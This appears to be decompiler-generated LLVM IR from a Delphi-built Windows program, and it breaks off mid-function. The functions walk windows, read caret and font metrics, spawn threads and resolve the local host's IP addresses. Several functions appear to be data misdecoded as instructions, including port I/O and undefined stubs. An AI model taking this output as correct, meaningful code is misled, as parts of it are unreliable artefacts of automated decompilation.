define i32 @function_4073bc() local_unnamed_addr {
dec_label_pc_4073bc:
  %0 = call i32 @function_4036c8(), !insn.addr !1856
  %1 = call i32 @function_4036c8(), !insn.addr !1857
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1858
  %3 = icmp eq i32 %2, 2, !insn.addr !1859
  %4 = zext i1 %3 to i32, !insn.addr !1860
  %5 = and i32 %2, -256, !insn.addr !1860
  %6 = or i32 %5, %4, !insn.addr !1860
  ret i32 %6, !insn.addr !1861
}

define i32 @function_4073ec() local_unnamed_addr {
dec_label_pc_4073ec:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1862
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1862
  %esp.02.reg2mem = alloca i32, !insn.addr !1862
  %storemerge3.reg2mem = alloca i32, !insn.addr !1862
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1863
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1863
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1863
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1864
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1865
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1866
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1866
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1867
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1867
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1867
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1868
  %9 = icmp eq i1 %8, false, !insn.addr !1869
  %10 = icmp eq i1 %9, false, !insn.addr !1870
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1870
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1870
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1870
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1870
  br i1 %10, label %dec_label_pc_407410, label %dec_label_pc_407450, !insn.addr !1870

dec_label_pc_407410:                              ; preds = %dec_label_pc_4073ec, %dec_label_pc_407410
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_4072d8(), !insn.addr !1871
  %12 = call i32 @function_4073ec(), !insn.addr !1872
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1873
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1873
  store i32 2, i32* %14, align 4, !insn.addr !1873
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1874
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1874
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1874
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1875
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1867
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1867
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1868
  %21 = icmp eq i1 %20, false, !insn.addr !1869
  %22 = icmp eq i1 %21, false, !insn.addr !1870
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1870
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1870
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1870
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1870
  br i1 %22, label %dec_label_pc_407410, label %dec_label_pc_407450, !insn.addr !1870

dec_label_pc_407450:                              ; preds = %dec_label_pc_407410, %dec_label_pc_4073ec
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1876
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1877
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1878
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1878
  store i32 4224109, i32* %25, align 4, !insn.addr !1878
  %26 = call i32 @"@LStrClr"(), !insn.addr !1879
  ret i32 %26, !insn.addr !1880
}

define i32 @function_407466() local_unnamed_addr {
dec_label_pc_407466:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1881
  ret i32 %0, !insn.addr !1881
}

define i32 @function_40746b() local_unnamed_addr {
dec_label_pc_40746b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1882
}

define i32 @function_40746d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40746d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1883
}

define i32 @function_407478() local_unnamed_addr {
dec_label_pc_407478:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1884
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1884
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1884
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1885
  %2 = call i32 @function_40730c(), !insn.addr !1886
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1887
  %4 = call i32 @function_4073ec(), !insn.addr !1888
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1889
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1890
  %6 = call i32 @"@LStrClr"(), !insn.addr !1891
  ret i32 %6, !insn.addr !1892
}

define i32 @function_4074d9() local_unnamed_addr {
dec_label_pc_4074d9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1893
  ret i32 %0, !insn.addr !1893
}

define i32 @function_4074de() local_unnamed_addr {
dec_label_pc_4074de:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1894
}

define i32 @function_4074e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4074e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1895
}

define i32 @function_4074fb() local_unnamed_addr {
dec_label_pc_4074fb:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1896
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1896
  store i32 %3, i32* %4, align 4, !insn.addr !1896
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1897
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1897
  %9 = add i8 %6, %8, !insn.addr !1897
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1897
  store i8 %9, i8* %10, align 1, !insn.addr !1897
  %11 = add i32 %2, 81, !insn.addr !1898
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1898
  %13 = load i8, i8* %12, align 1, !insn.addr !1898
  %14 = trunc i32 %1 to i8, !insn.addr !1898
  %15 = add i8 %13, %14, !insn.addr !1898
  store i8 %15, i8* %12, align 1, !insn.addr !1898
  %16 = load i32, i32* %eax, align 4, !insn.addr !1899
  ret i32 %16, !insn.addr !1899
}

define x86_fp80 @function_407503() local_unnamed_addr {
dec_label_pc_407503:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1900
  ret x86_fp80 %1, !insn.addr !1901
}

define i32 @function_407508() local_unnamed_addr {
dec_label_pc_407508:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1902
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1903
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1903
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1903
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1904
  %3 = call i32 @function_40730c(), !insn.addr !1905
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1906
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1907
  %6 = icmp eq i32 %5, 180, !insn.addr !1908
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1909
  br i1 %6, label %dec_label_pc_40756b, label %dec_label_pc_407546, !insn.addr !1909

dec_label_pc_407546:                              ; preds = %dec_label_pc_407508
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1910
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1911
  %10 = icmp eq i1 %9, false, !insn.addr !1912
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1912
  br i1 %10, label %dec_label_pc_40756b, label %dec_label_pc_407552, !insn.addr !1912

dec_label_pc_407552:                              ; preds = %dec_label_pc_407546
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1913
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40756b

dec_label_pc_40756b:                              ; preds = %dec_label_pc_407552, %dec_label_pc_407508, %dec_label_pc_407546
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1914
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1915
  %13 = add i32 %esp.1, 8, !insn.addr !1916
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1916
  store i32 4224398, i32* %14, align 4, !insn.addr !1916
  %15 = call i32 @"@LStrClr"(), !insn.addr !1917
  ret i32 %15, !insn.addr !1918
}

define i32 @function_407587() local_unnamed_addr {
dec_label_pc_407587:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1919
  ret i32 %0, !insn.addr !1919
}

define i32 @function_40758c() local_unnamed_addr {
dec_label_pc_40758c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1920
}

define i32 @function_40758e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40758e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1921
}

define i32 @function_4075a4() local_unnamed_addr {
dec_label_pc_4075a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1922
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1922
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1922
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1923
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1924
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1924
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1925
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1926
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1927
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1928
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1928
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1929
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1930
  %16 = ashr i32 %15, 31, !insn.addr !1931
  %17 = zext i32 %15 to i64, !insn.addr !1932
  %18 = zext i32 %16 to i64, !insn.addr !1932
  %19 = mul i64 %18, 4294967296, !insn.addr !1932
  %20 = or i64 %19, %17, !insn.addr !1932
  %21 = zext i32 %4 to i64, !insn.addr !1932
  %22 = sdiv i64 %20, %21, !insn.addr !1932
  %23 = trunc i64 %22 to i32, !insn.addr !1932
  ret i32 %23, !insn.addr !1933
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %esp.0.reg2mem = alloca i32, !insn.addr !1934
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1935
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1935
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1935
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1936
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1937
  %3 = icmp eq i32 %2, 0, !insn.addr !1937
  br i1 %3, label %dec_label_pc_40763c, label %dec_label_pc_407629, !insn.addr !1938

dec_label_pc_407629:                              ; preds = %dec_label_pc_407600
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1939
  store i32 0, i32* %4, align 4, !insn.addr !1939
  br label %dec_label_pc_40763c, !insn.addr !1940

dec_label_pc_40763c:                              ; preds = %dec_label_pc_407629, %dec_label_pc_407600
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1941
  %6 = icmp eq i32 %5, 0, !insn.addr !1941
  br i1 %6, label %dec_label_pc_407650, label %dec_label_pc_407646, !insn.addr !1942

dec_label_pc_407646:                              ; preds = %dec_label_pc_40763c
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1943
  %8 = icmp eq i32 %7, 0, !insn.addr !1943
  %9 = icmp eq i1 %8, false, !insn.addr !1944
  br i1 %9, label %dec_label_pc_40765a, label %dec_label_pc_407650, !insn.addr !1944

dec_label_pc_407650:                              ; preds = %dec_label_pc_407646, %dec_label_pc_40763c
  %10 = call i32 @function_407734(), !insn.addr !1945
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1946
  br label %dec_label_pc_4076f7, !insn.addr !1946

dec_label_pc_40765a:                              ; preds = %dec_label_pc_407646
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1947
  %12 = icmp eq i8 %11, 0, !insn.addr !1947
  br i1 %12, label %dec_label_pc_407683, label %dec_label_pc_407664, !insn.addr !1948

dec_label_pc_407664:                              ; preds = %dec_label_pc_40765a
  %13 = call i32 @function_406f1c(), !insn.addr !1949
  %14 = icmp eq i32 %13, 0, !insn.addr !1950
  br i1 %14, label %dec_label_pc_407683, label %dec_label_pc_40767c, !insn.addr !1951

dec_label_pc_40767c:                              ; preds = %dec_label_pc_407664
  %15 = call i32 @function_407734(), !insn.addr !1952
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1953
  br label %dec_label_pc_4076f7, !insn.addr !1953

dec_label_pc_407683:                              ; preds = %dec_label_pc_407664, %dec_label_pc_40765a
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1954
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1955
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4220328 to i32*), i32 0, i32* null), !insn.addr !1956
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4220328 to i32*), i32 0, i32* null), !insn.addr !1957
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1958
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1958
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4220328 to i32*), i32 0, i32* null), !insn.addr !1959
  %23 = call i32 @function_407734(), !insn.addr !1960
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1960
  br label %dec_label_pc_4076f7, !insn.addr !1960

dec_label_pc_4076f7:                              ; preds = %dec_label_pc_407683, %dec_label_pc_40767c, %dec_label_pc_407650
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1961
  %25 = load i32, i32* %24, align 4, !insn.addr !1961
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1962
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1963
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1963
  store i32 4224788, i32* %27, align 4, !insn.addr !1963
  %28 = call i32 @"@LStrClr"(), !insn.addr !1964
  ret i32 %28, !insn.addr !1965
}

define i32 @function_40770d() local_unnamed_addr {
dec_label_pc_40770d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1966
  ret i32 %0, !insn.addr !1966
}

define i32 @function_407712() local_unnamed_addr {
dec_label_pc_407712:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1967
}

define i32 @function_407714(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407714:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1968
}

define i32 @function_407734() local_unnamed_addr {
dec_label_pc_407734:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1969
  %1 = call i32 @"@LStrClr"(), !insn.addr !1970
  ret i32 %1, !insn.addr !1971
}

define i32 @function_40774c() local_unnamed_addr {
dec_label_pc_40774c:
  %eax.0.reg2mem = alloca i32, !insn.addr !1972
  %esp.0.reg2mem = alloca i32, !insn.addr !1972
  %esp.15.reg2mem = alloca i32, !insn.addr !1972
  %storemerge6.reg2mem = alloca i32, !insn.addr !1972
  %.reg2mem = alloca i32, !insn.addr !1972
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1972
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1973
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1974
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1975
  %5 = call i32 @"@LStrClr"(), !insn.addr !1976
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1977
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1977
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1978
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1979
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1980
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1980
  %11 = icmp eq %hostent* %9, null, !insn.addr !1981
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1982
  br i1 %11, label %dec_label_pc_4077aa, label %dec_label_pc_407784, !insn.addr !1982

dec_label_pc_407784:                              ; preds = %dec_label_pc_40774c
  %12 = add i32 %10, 12, !insn.addr !1983
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1983
  %14 = load i32, i32* %13, align 4, !insn.addr !1983
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1984
  %16 = load i32, i32* %15, align 4, !insn.addr !1984
  %17 = icmp eq i32 %16, 0, !insn.addr !1985
  %18 = icmp eq i1 %17, false, !insn.addr !1986
  br i1 %18, label %dec_label_pc_40778b.lr.ph, label %dec_label_pc_4077a5, !insn.addr !1986

dec_label_pc_40778b.lr.ph:                        ; preds = %dec_label_pc_407784
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1979
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40778b

dec_label_pc_40778b:                              ; preds = %dec_label_pc_40778b.lr.ph, %dec_label_pc_40779d
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1987
  %21 = icmp eq i1 %20, false, !insn.addr !1988
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1988
  br i1 %21, label %dec_label_pc_40779d, label %dec_label_pc_40778f, !insn.addr !1988

dec_label_pc_40778f:                              ; preds = %dec_label_pc_40778b
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1989
  %23 = load i32, i32* %22, align 4, !insn.addr !1989
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1989
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1989
  store i32 %23, i32* %25, align 4, !insn.addr !1989
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1990
  %27 = call i32 @StrPas(), !insn.addr !1991
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1991
  br label %dec_label_pc_40779d, !insn.addr !1991

dec_label_pc_40779d:                              ; preds = %dec_label_pc_40778f, %dec_label_pc_40778b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1992
  %29 = mul i32 %28, 4, !insn.addr !1984
  %30 = add i32 %29, %14, !insn.addr !1984
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1984
  %32 = load i32, i32* %31, align 4, !insn.addr !1984
  %33 = icmp eq i32 %32, 0, !insn.addr !1985
  %34 = icmp eq i1 %33, false, !insn.addr !1986
  store i32 %32, i32* %.reg2mem, !insn.addr !1986
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1986
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1986
  br i1 %34, label %dec_label_pc_40778b, label %dec_label_pc_4077a5, !insn.addr !1986

dec_label_pc_4077a5:                              ; preds = %dec_label_pc_40779d, %dec_label_pc_407784
  %35 = call i32 @WSACleanup(), !insn.addr !1993
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1993
  br label %dec_label_pc_4077aa, !insn.addr !1993

dec_label_pc_4077aa:                              ; preds = %dec_label_pc_4077a5, %dec_label_pc_40774c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1994
}

define i32 @function_4077b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4049a4(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !1995
  ret i32 %3, !insn.addr !1996
}

define i32 @function_407804(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407804:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !1997
  %2 = icmp eq i1 %1, false, !insn.addr !1998
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4049a4(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !1999
  ret i32 %3, !insn.addr !2000
}

define i32 @function_407834(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407834:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2001
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2001
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2001
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2002
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2003
  %3 = call i32 @"@LStrPos"(), !insn.addr !2004
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40790c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2005
  %6 = call i32 @"@LStrPos"(), !insn.addr !2006
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40790c to i32)
  %8 = call i32 @function_4049a4(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2007
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2008
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2009
  ret i32 %9, !insn.addr !2010
}

define i32 @function_4078cc() local_unnamed_addr {
dec_label_pc_4078cc:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2011
  ret i32 %0, !insn.addr !2011
}

define i32 @function_4078d1() local_unnamed_addr {
dec_label_pc_4078d1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2012
}

define i32 @function_4078d3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078d3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2013
}

define i32 @function_4078e3() local_unnamed_addr {
dec_label_pc_4078e3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2014
}

define i32 @function_407930() local_unnamed_addr {
dec_label_pc_407930:
  %0 = call i32 @function_404818(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079a0, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079ac, i32 0, i32 0), i32 4224952), !insn.addr !2015
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2016
  %1 = call i32 @function_404818(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079a0, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079c8, i32 0, i32 0), i32 4225028), !insn.addr !2017
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2018
  %2 = call i32 @function_404818(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079e0, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_4079ec, i32 0, i32 0), i32 4225076), !insn.addr !2019
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2020
  ret i32 %2, !insn.addr !2021
}

define i32 @function_4079a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_4079a0:
  %merge.reg2mem = alloca i32, !insn.addr !2022
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_4()
  %8 = call i1 @__decompiler_undefined_function_4()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2022
  br i1 %10, label %dec_label_pc_4079cf, label %dec_label_pc_4079a2, !insn.addr !2022

dec_label_pc_4079a2:                              ; preds = %dec_label_pc_4079a0
  br i1 %8, label %dec_label_pc_4079d8, label %dec_label_pc_4079a5, !insn.addr !2023

dec_label_pc_4079a5:                              ; preds = %dec_label_pc_4079a2
  %11 = trunc i32 %4 to i16, !insn.addr !2024
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2024
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2024
  store i8 %12, i8* %13, align 1, !insn.addr !2024
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2025
  store i8 %14, i8* %13, align 1, !insn.addr !2025
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2026
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2026
  %19 = add i8 %16, %18, !insn.addr !2026
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2026
  store i8 %19, i8* %20, align 1, !insn.addr !2026
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2027
  %21 = trunc i32 %arg10 to i16, !insn.addr !2028
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2028
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2028
  store i32 %22, i32* %23, align 4, !insn.addr !2028
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2029
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2030
  %25 = load i8, i8* %24, align 1, !insn.addr !2030
  %26 = trunc i32 %arg1 to i8, !insn.addr !2030
  %27 = add i8 %25, %26, !insn.addr !2030
